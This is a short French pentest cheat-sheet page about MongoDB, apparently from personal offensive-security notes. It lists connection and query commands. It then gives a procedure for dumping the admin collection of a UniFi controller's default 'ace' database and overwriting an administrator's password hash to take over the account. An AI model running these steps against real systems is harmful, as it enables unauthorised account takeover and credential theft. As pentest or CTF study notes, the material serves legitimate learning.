<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](web_server.md)</sub>
#Mongo DB

**Présentation :** Base de données NO SQL

**CMD :** mongo mongodb://***RHOST:*RPORT*

**Help :**
- *show dbs;* : avoir la liste des bdd
- *use **BDD*** : utiliser la bdd
- *show collections;* : voir les tables
- db.**TABLE**.find().pretty() : contenu de la table en json dans l output

**Procédure :**
- on cherche si présent : ps aux | grep mongo
- Tester car peut donnerr le mdp admin : *mongo --port **PORT_MONGO** ace --eval "db.admin.find().forEach(printjson);* 
  - Si réponse : *UniFi Default Database datamase name par défaut est "ace"*
    -  *mongo --port **PORT_MONGO** ace --eval "db.admin.find().forEach(printjson); --eval* : pour passer du scipt js
 -  Si on trouve un utilisateur on peut modifier son mdp en en créant un en SHA512:
    -  *mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("azeazeazeaz")},{$set:{"**USERNAME**":"**MDP_SHA_512**"}})'*
